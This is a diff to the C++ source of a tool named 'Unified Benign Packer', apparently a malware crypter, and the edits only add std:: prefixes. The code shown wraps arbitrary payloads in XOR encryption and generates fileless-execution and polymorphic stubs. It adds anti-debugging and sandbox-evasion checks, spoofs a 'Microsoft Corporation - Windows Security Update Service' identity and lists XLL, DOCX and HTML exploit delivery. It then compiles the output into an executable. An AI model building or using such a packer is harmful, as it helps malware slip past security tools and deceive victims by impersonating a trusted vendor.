@@ -62,40 +62,40 @@ public:
     }
     
     bool Initialize() {
-        cout << "UNIFIED BENIGN PACKER - COMPLETE FRAMEWORK" << endl;
-        cout << "==========================================" << endl;
-        cout << "Combining ALL components:" << endl;
-        cout << "- PE Encryption & Packing" << endl;
-        cout << "- Fileless Execution Systems" << endl;
-        cout << "- Advanced Exploit Framework" << endl;
-        cout << "- Unique Stub Generation (71 variants)" << endl;
-        cout << "- Anti-Analysis & Evasion" << endl;
-        cout << "- Company Profile Spoofing" << endl;
-        cout << "- Polymorphic Code Generation" << endl;
-        cout << "==========================================" << endl;
+        std::cout << "UNIFIED BENIGN PACKER - COMPLETE FRAMEWORK" << std::endl;
+        std::cout << "==========================================" << std::endl;
+        std::cout << "Combining ALL components:" << std::endl;
+        std::cout << "- PE Encryption & Packing" << std::endl;
+        std::cout << "- Fileless Execution Systems" << std::endl;
+        std::cout << "- Advanced Exploit Framework" << std::endl;
+        std::cout << "- Unique Stub Generation (71 variants)" << std::endl;
+        std::cout << "- Anti-Analysis & Evasion" << std::endl;
+        std::cout << "- Company Profile Spoofing" << std::endl;
+        std::cout << "- Polymorphic Code Generation" << std::endl;
+        std::cout << "==========================================" << std::endl;
         
         // Create output directories
-        filesystem::create_directories("output");
-        filesystem::create_directories("temp");
-        filesystem::create_directories("plugins");
+        std::filesystem::create_directories("output");
+        std::filesystem::create_directories("temp");
+        std::filesystem::create_directories("plugins");
         
         return true;
     }
     
     // ===== MAIN PROCESSING FUNCTION =====
-    bool ProcessFile(const string& inputFile, const string& outputFile, const string& method = "unified") {
-        cout << "\n[PACK] Processing file: " << inputFile << endl;
-        cout << "Output: " << outputFile << endl;
-        cout << "Method: " << method << endl;
+    bool ProcessFile(const std::string& inputFile, const std::string& outputFile, const std::string& method = "unified") {
+        std::cout << "\n[PACK] Processing file: " << inputFile << std::endl;
+        std::cout << "Output: " << outputFile << std::endl;
+        std::cout << "Method: " << method << std::endl;
         
         // Read input file
-        vector<uint8_t> payload = ReadFile(inputFile);
+        std::vector<uint8_t> payload = ReadFile(inputFile);
         if (payload.empty()) {
-            cout << "[ERROR] Failed to read input file" << endl;
+            std::cout << "[ERROR] Failed to read input file" << std::endl;
             return false;
         }
         
-        cout << "Payload size: " << payload.size() << " bytes" << endl;
+        std::cout << "Payload size: " << payload.size() << " bytes" << std::endl;
         
         // Process based on method
         if (method == "pe_encrypt") {
@@ -109,17 +109,17 @@ public:
         } else if (method == "unified") {
             return ProcessUnifiedMethod(payload, outputFile);
         } else {
-            cout << "[ERROR] Unknown method: " << method << endl;
+            std::cout << "[ERROR] Unknown method: " << method << std::endl;
             return false;
         }
     }
     
     // ===== PE ENCRYPTION SYSTEM =====
-    bool ProcessPEEncryption(const vector<uint8_t>& payload, const string& outputFile) {
-        cout << "[PE] Using PE Encryption System..." << endl;
+    bool ProcessPEEncryption(const std::vector<uint8_t>& payload, const std::string& outputFile) {
+        std::cout << "[PE] Using PE Encryption System..." << std::endl;
         
         // Generate PE header
-        vector<uint8_t> peData = GeneratePEHeader(payload);
+        std::vector<uint8_t> peData = GeneratePEHeader(payload);
         
         // Apply encryption layers
         peData = ApplyTripleEncryption(peData);
@@ -135,11 +135,11 @@ public:
     }
     
     // ===== FILELESS EXECUTION SYSTEM =====
-    bool ProcessFilelessExecution(const vector<uint8_t>& payload, const string& outputFile) {
-        cout << "[FILELESS] Using Fileless Execution System..." << endl;
+    bool ProcessFilelessExecution(const std::vector<uint8_t>& payload, const std::string& outputFile) {
+        std::cout << "[FILELESS] Using Fileless Execution System..." << std::endl;
         
         // Generate fileless stub
-        string stubCode = GenerateFilelessStub(payload);
+        std::string stubCode = GenerateFilelessStub(payload);
         
         // Add advanced features
         stubCode = AddFilelessFeatures(stubCode);
@@ -149,11 +149,11 @@ public:
     }
     
     // ===== EXPLOIT SYSTEM =====
-    bool ProcessExploitSystem(const vector<uint8_t>& payload, const string& outputFile) {
-        cout << "[EXPLOIT] Using Advanced Exploit System..." << endl;
+    bool ProcessExploitSystem(const std::vector<uint8_t>& payload, const string& outputFile) {
+        std::cout << "[EXPLOIT] Using Advanced Exploit System..." << std::endl;
         
         // Generate exploit code
-        string exploitCode = GenerateExploitCode(payload);
+        std::string exploitCode = GenerateExploitCode(payload);
         
         // Add XLL, DOCX, HTML exploits
         exploitCode = AddExploitMethods(exploitCode);
@@ -163,11 +163,11 @@ public:
     }
     
     // ===== STUB GENERATION SYSTEM =====
-    bool ProcessStubGeneration(const vector<uint8_t>& payload, const string& outputFile) {
-        cout << "[STUB] Using Unique Stub Generation (71 variants)..." << endl;
+    bool ProcessStubGeneration(const std::vector<uint8_t>& payload, const string& outputFile) {
+        std::cout << "[STUB] Using Unique Stub Generation (71 variants)..." << std::endl;
         
         // Generate advanced stub
-        string stubCode = GenerateAdvancedStub(payload);
+        std::string stubCode = GenerateAdvancedStub(payload);
         
         // Add 40+ mutex systems
         stubCode = AddMutexSystems(stubCode);
@@ -183,14 +183,14 @@ public:
     }
     
     // ===== UNIFIED METHOD (COMBINES ALL) =====
-    bool ProcessUnifiedMethod(const vector<uint8_t>& payload, const string& outputFile) {
-        cout << "[UNIFIED] Using Complete Unified Framework..." << endl;
+    bool ProcessUnifiedMethod(const std::vector<uint8_t>& payload, const string& outputFile) {
+        std::cout << "[UNIFIED] Using Complete Unified Framework..." << std::endl;
         
         // Step 1: Apply PE encryption
-        vector<uint8_t> encryptedData = ApplyTripleEncryption(payload);
+        std::vector<uint8_t> encryptedData = ApplyTripleEncryption(payload);
         
         // Step 2: Generate advanced stub
-        string stubCode = GenerateUnifiedStub(encryptedData);
+        std::string stubCode = GenerateUnifiedStub(encryptedData);
         
         // Step 3: Add all features
         stubCode = AddAllFeatures(stubCode);
@@ -201,15 +201,15 @@ public:
     
     // ===== HELPER FUNCTIONS =====
     
-    vector<uint8_t> ReadFile(const string& filePath) {
+    std::vector<uint8_t> ReadFile(const string& filePath) {
         ifstream file(filePath, ios::binary);
         if (!file.is_open()) return {};
         
-        return vector<uint8_t>((istreambuf_iterator<char>(file)),
+        return std::vector<uint8_t>((istreambuf_iterator<char>(file)),
                               istreambuf_iterator<char>());
     }
     
-    bool WriteFile(const string& filePath, const vector<uint8_t>& data) {
+    bool WriteFile(const string& filePath, const std::vector<uint8_t>& data) {
         ofstream file(filePath, ios::binary);
         if (!file.is_open()) return false;
         
@@ -219,9 +219,9 @@ public:
     
     // ===== PE ENCRYPTION FUNCTIONS =====
     
-    vector<uint8_t> GeneratePEHeader(const vector<uint8_t>& payload) {
+    std::vector<uint8_t> GeneratePEHeader(const std::vector<uint8_t>& payload) {
         // Basic PE header generation
-        vector<uint8_t> peData;
+        std::vector<uint8_t> peData;
         
         // DOS header
         peData.insert(peData.end(), {
@@ -241,8 +241,8 @@ public:
         return peData;
     }
     
-    vector<uint8_t> ApplyTripleEncryption(const vector<uint8_t>& data) {
-        vector<uint8_t> encrypted = data;
+    std::vector<uint8_t> ApplyTripleEncryption(const std::vector<uint8_t>& data) {
+        std::vector<uint8_t> encrypted = data;
         
         // Layer 1: XOR encryption
         for (size_t i = 0; i < encrypted.size(); ++i) {
@@ -262,22 +262,22 @@ public:
         return encrypted;
     }
     
-    vector<uint8_t> ApplyCompanyProfile(const vector<uint8_t>& data) {
+    std::vector<uint8_t> ApplyCompanyProfile(const std::vector<uint8_t>& data) {
         // Add company profile information
-        vector<uint8_t> result = data;
+        std::vector<uint8_t> result = data;
         
-        string companyInfo = "Microsoft Corporation - Windows Security Update Service";
+        std::string companyInfo = "Microsoft Corporation - Windows Security Update Service";
         result.insert(result.end(), companyInfo.begin(), companyInfo.end());
         
         return result;
     }
     
-    vector<uint8_t> ApplyAntiAnalysis(const vector<uint8_t>& data) {
+    std::vector<uint8_t> ApplyAntiAnalysis(const std::vector<uint8_t>& data) {
         // Add anti-analysis features
-        vector<uint8_t> result = data;
+        std::vector<uint8_t> result = data;
         
         // Add anti-debug code
-        string antiDebug = "IsDebuggerPresent CheckRemoteDebuggerPresent";
+        std::string antiDebug = "IsDebuggerPresent CheckRemoteDebuggerPresent";
         result.insert(result.end(), antiDebug.begin(), antiDebug.end());
         
         return result;
@@ -285,7 +285,7 @@ public:
     
     // ===== FILELESS EXECUTION FUNCTIONS =====
     
-    string GenerateFilelessStub(const vector<uint8_t>& payload) {
+    std::string GenerateFilelessStub(const std::vector<uint8_t>& payload) {
         stringstream stub;
         
         stub << R"(
@@ -333,9 +333,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return stub.str();
     }
     
-    string AddFilelessFeatures(const string& stub) {
+    std::string AddFilelessFeatures(const string& stub) {
         // Add advanced fileless features
-        string enhanced = stub;
+        std::string enhanced = stub;
         
         // Add timing checks
         enhanced += "\n// Timing checks for sandbox detection\n";
@@ -348,7 +348,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     
     // ===== EXPLOIT SYSTEM FUNCTIONS =====
     
-    string GenerateExploitCode(const vector<uint8_t>& payload) {
+    std::string GenerateExploitCode(const std::vector<uint8_t>& payload) {
         stringstream exploit;
         
         exploit << R"(
@@ -376,8 +376,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return exploit.str();
     }
     
-    string AddExploitMethods(const string& code) {
-        string enhanced = code;
+    std::string AddExploitMethods(const string& code) {
+        std::string enhanced = code;
         
         // Add XLL exploit
         enhanced += "\n// XLL Excel Add-in Exploit\n";
@@ -396,7 +396,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     
     // ===== STUB GENERATION FUNCTIONS =====
     
-    string GenerateAdvancedStub(const vector<uint8_t>& payload) {
+    std::string GenerateAdvancedStub(const std::vector<uint8_t>& payload) {
         stringstream stub;
         
         stub << R"(
@@ -423,8 +423,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return stub.str();
     }
     
-    string AddMutexSystems(const string& stub) {
-        string enhanced = stub;
+    std::string AddMutexSystems(const string& stub) {
+        std::string enhanced = stub;
         
         // Add 40+ mutex systems
         enhanced += "\n// 40+ Advanced Mutex Systems\n";
@@ -435,8 +435,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return enhanced;
     }
     
-    string AddCompanyProfiles(const string& stub) {
-        string enhanced = stub;
+    std::string AddCompanyProfiles(const string& stub) {
+        std::string enhanced = stub;
         
         // Add company profiles
         enhanced += "\n// Company Profile Spoofing\n";
@@ -447,7 +447,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     
     // ===== UNIFIED STUB GENERATION =====
     
-    string GenerateUnifiedStub(const vector<uint8_t>& payload) {
+    std::string GenerateUnifiedStub(const std::vector<uint8_t>& payload) {
         stringstream stub;
         
         stub << R"(
@@ -538,8 +538,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return stub.str();
     }
     
-    string AddAllFeatures(const string& stub) {
-        string enhanced = stub;
+    std::string AddAllFeatures(const string& stub) {
+        std::string enhanced = stub;
         
         // Add all the features
         enhanced += "\n// 40+ Advanced Mutex Systems\n";
@@ -554,23 +554,23 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     // ===== COMPILATION FUNCTION =====
     
     bool CompileToExe(const string& sourceCode, const string& outputFile) {
-        string tempDir = "temp";
-        string sourceFile = tempDir + "\\unified_stub_" + to_string(GetTickCount64()) + ".cpp";
+        std::string tempDir = "temp";
+        std::string sourceFile = tempDir + "\\unified_stub_" + to_string(GetTickCount64()) + ".cpp";
         
         // Write source to file
         ofstream sourceStream(sourceFile);
         if (!sourceStream.is_open()) {
-            cout << "[ERROR] Failed to create temporary source file" << endl;
+            std::cout << "[ERROR] Failed to create temporary source file" << std::endl;
             return false;
         }
         sourceStream << sourceCode;
         sourceStream.close();
         
         // Compile with Visual Studio
-        string compileCmd = "cl.exe /std:c++17 /O2 /MT /DWIN32_LEAN_AND_MEAN \"";
+        std::string compileCmd = "cl.exe /std:c++17 /O2 /MT /DWIN32_LEAN_AND_MEAN \"";
         compileCmd += sourceFile + "\" /link /SUBSYSTEM:WINDOWS /OUT:\"" + outputFile + "\"";
         
-        cout << "[COMPILE] Compiling with Visual Studio..." << endl;
+        std::cout << "[COMPILE] Compiling with Visual Studio..." << std::endl;
         
         int result = system(compileCmd.c_str());
         
@@ -578,10 +578,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         filesystem::remove(sourceFile);
         
         if (result == 0) {
-            cout << "[SUCCESS] Compilation successful!" << endl;
+            std::cout << "[SUCCESS] Compilation successful!" << std::endl;
             return true;
         } else {
-            cout << "[ERROR] Compilation failed with exit code: " << result << endl;
+            std::cout << "[ERROR] Compilation failed with exit code: " << result << std::endl;
             return false;
         }
     }
@@ -589,40 +589,40 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     // ===== HELP AND STATUS FUNCTIONS =====
     
     void ShowHelp() {
-        cout << "\n[HELP] UNIFIED BENIGN PACKER USAGE:" << endl;
-        cout << "=====================================" << endl;
-        cout << "UnifiedBenignPacker.exe <input_file> [output_file] [method]" << endl;
-        cout << "\nParameters:" << endl;
-        cout << "  input_file  - Path to input file (.bin, .exe, .dll, .raw)" << endl;
-        cout << "  output_file - Output .exe file path (optional)" << endl;
-        cout << "  method      - Processing method (optional)" << endl;
-        cout << "\nAvailable Methods:" << endl;
-        cout << "  unified     - Complete unified framework (default)" << endl;
-        cout << "  pe_encrypt  - PE encryption and packing" << endl;
-        cout << "  fileless    - Fileless execution system" << endl;
-        cout << "  exploit     - Advanced exploit framework" << endl;
-        cout << "  stub        - Unique stub generation (71 variants)" << endl;
-        cout << "\nExamples:" << endl;
-        cout << "  UnifiedBenignPacker.exe payload.bin" << endl;
-        cout << "  UnifiedBenignPacker.exe payload.bin output.exe unified" << endl;
-        cout << "  UnifiedBenignPacker.exe payload.bin pe_output.exe pe_encrypt" << endl;
+        std::cout << "\n[HELP] UNIFIED BENIGN PACKER USAGE:" << std::endl;
+        std::cout << "=====================================" << std::endl;
+        std::cout << "UnifiedBenignPacker.exe <input_file> [output_file] [method]" << std::endl;
+        std::cout << "\nParameters:" << std::endl;
+        std::cout << "  input_file  - Path to input file (.bin, .exe, .dll, .raw)" << std::endl;
+        std::cout << "  output_file - Output .exe file path (optional)" << std::endl;
+        std::cout << "  method      - Processing method (optional)" << std::endl;
+        std::cout << "\nAvailable Methods:" << std::endl;
+        std::cout << "  unified     - Complete unified framework (default)" << std::endl;
+        std::cout << "  pe_encrypt  - PE encryption and packing" << std::endl;
+        std::cout << "  fileless    - Fileless execution system" << std::endl;
+        std::cout << "  exploit     - Advanced exploit framework" << std::endl;
+        std::cout << "  stub        - Unique stub generation (71 variants)" << std::endl;
+        std::cout << "\nExamples:" << std::endl;
+        std::cout << "  UnifiedBenignPacker.exe payload.bin" << std::endl;
+        std::cout << "  UnifiedBenignPacker.exe payload.bin output.exe unified" << std::endl;
+        std::cout << "  UnifiedBenignPacker.exe payload.bin pe_output.exe pe_encrypt" << std::endl;
     }
     
     void ShowStatus() {
-        cout << "\n[STATUS] UNIFIED BENIGN PACKER STATUS:" << endl;
-        cout << "=====================================" << endl;
-        cout << "Framework: Complete Unified System" << endl;
-        cout << "Components:" << endl;
-        cout << "  - PE Encryption & Packing" << endl;
-        cout << "  - Fileless Execution Systems" << endl;
-        cout << "  - Advanced Exploit Framework" << endl;
-        cout << "  - Unique Stub Generation (71 variants)" << endl;
-        cout << "  - Anti-Analysis & Evasion" << endl;
-        cout << "  - Company Profile Spoofing" << endl;
-        cout << "  - Polymorphic Code Generation" << endl;
-        cout << "\nSettings:" << endl;
+        std::cout << "\n[STATUS] UNIFIED BENIGN PACKER STATUS:" << std::endl;
+        std::cout << "=====================================" << std::endl;
+        std::cout << "Framework: Complete Unified System" << std::endl;
+        std::cout << "Components:" << std::endl;
+        std::cout << "  - PE Encryption & Packing" << std::endl;
+        std::cout << "  - Fileless Execution Systems" << std::endl;
+        std::cout << "  - Advanced Exploit Framework" << std::endl;
+        std::cout << "  - Unique Stub Generation (71 variants)" << std::endl;
+        std::cout << "  - Anti-Analysis & Evasion" << std::endl;
+        std::cout << "  - Company Profile Spoofing" << std::endl;
+        std::cout << "  - Polymorphic Code Generation" << std::endl;
+        std::cout << "\nSettings:" << std::endl;
         for (const auto& pair : settings) {
-            cout << "  " << pair.first << ": " << pair.second << endl;
+            std::cout << "  " << pair.first << ": " << pair.second << std::endl;
         }
     }
 };
@@ -633,7 +633,7 @@ int main(int argc, char* argv[]) {
     UnifiedBenignPacker packer;
     
     if (!packer.Initialize()) {
-        cout << "[ERROR] Failed to initialize Unified BenignPacker" << endl;
+        std::cout << "[ERROR] Failed to initialize Unified BenignPacker" << std::endl;
         return 1;
     }
     
@@ -643,29 +643,29 @@ int main(int argc, char* argv[]) {
         return 0;
     }
     
-    string inputFile = argv[1];
-    string outputFile = (argc >= 3) ? argv[2] : "unified_output.exe";
-    string method = (argc >= 4) ? argv[3] : "unified";
+    std::string inputFile = argv[1];
+    std::string outputFile = (argc >= 3) ? argv[2] : "unified_output.exe";
+    std::string method = (argc >= 4) ? argv[3] : "unified";
     
     // Check if input file exists
     if (!filesystem::exists(inputFile)) {
-        cout << "[ERROR] Input file not found: " << inputFile << endl;
+        std::cout << "[ERROR] Input file not found: " << inputFile << std::endl;
         return 1;
     }
     
     // Process the file
     if (packer.ProcessFile(inputFile, outputFile, method)) {
-        cout << "\n[SUCCESS] Generated: " << outputFile << endl;
+        std::cout << "\n[SUCCESS] Generated: " << outputFile << std::endl;
         
         // Show file information
         if (filesystem::exists(outputFile)) {
             auto fileSize = filesystem::file_size(outputFile);
-            cout << "File size: " << fileSize << " bytes" << endl;
+            std::cout << "File size: " << fileSize << " bytes" << std::endl;
         }
         
         return 0;
     } else {
-        cout << "\n[ERROR] Failed to generate executable" << endl;
+        std::cout << "\n[ERROR] Failed to generate executable" << std::endl;
         return 1;
     }
 }
